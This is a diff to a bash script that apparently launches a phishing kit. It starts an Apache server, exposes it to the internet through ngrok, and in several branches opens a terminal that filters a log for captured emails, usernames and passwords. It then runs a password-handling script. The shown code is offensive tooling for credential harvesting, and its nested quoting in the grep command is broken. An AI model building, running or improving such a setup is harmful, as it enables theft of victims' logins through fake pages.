@@ -44,6 +44,8 @@ case $Choice in
 			 1) sudo apt-get install apache2
 		            hostnamectl
 		systemctl start apache2
+		apt install xterm
+		apt install gnome-terminal
 		systemctl restart apache2.service
 		mkdir /var
 		mkdir /var/www
@@ -66,12 +68,14 @@ case $Choice in
 		sleep 11
 		gnome-terminal -x bash -c "./ngrok http 80; exec bash"
                 cd /var/www/html/
-	        xterm -hold -e tail -f log.txt
+		gnome-terminal -x bash -c "tail -f log.txt | grep -e "email" -e "username" -e "password"; exec bash"
 		./password.sh
 		;;
 	        2) sudo apt-get install apache2
 		hostnamectl
 		systemctl start apache2
+		apt install xterm
+		apt install gnome-terminal
 		systemctl restart apache2.service
 		mkdir /var
 		mkdir /var/www
@@ -92,7 +96,7 @@ case $Choice in
 		sleep 11
 		gnome-terminal -x bash -c "./ngrok http 80; exec bash"
                 cd /var/www/html/
-		xterm -hold -e tail -f log.txt
+		gnome-terminal -x bash -c "tail -f log.txt | grep -e "email" -e "username" -e "password"; exec bash"
 		./password.sh
 		;;
                 esac
@@ -101,6 +105,8 @@ case $Choice in
 		sudo apt-get install apache2
 		hostnamectl
 		systemctl start apache2
+		apt install gnome-terminal
+		apt install xterm
 		systemctl restart apache2.service
 		mkdir /var
 		mkdir /var/www
@@ -121,7 +127,7 @@ case $Choice in
 		sleep 11
 		gnome-terminal -x bash -c "./ngrok http 80; exec bash"
                 cd /var/www/html/
-		xterm -hold -e tail -f log.txt
+		gnome-terminal -x bash -c "tail -f log.txt | grep -e "email" -e "username" -e "password"; exec bash"
 		./password.sh
 		;;
 	3)printf ""
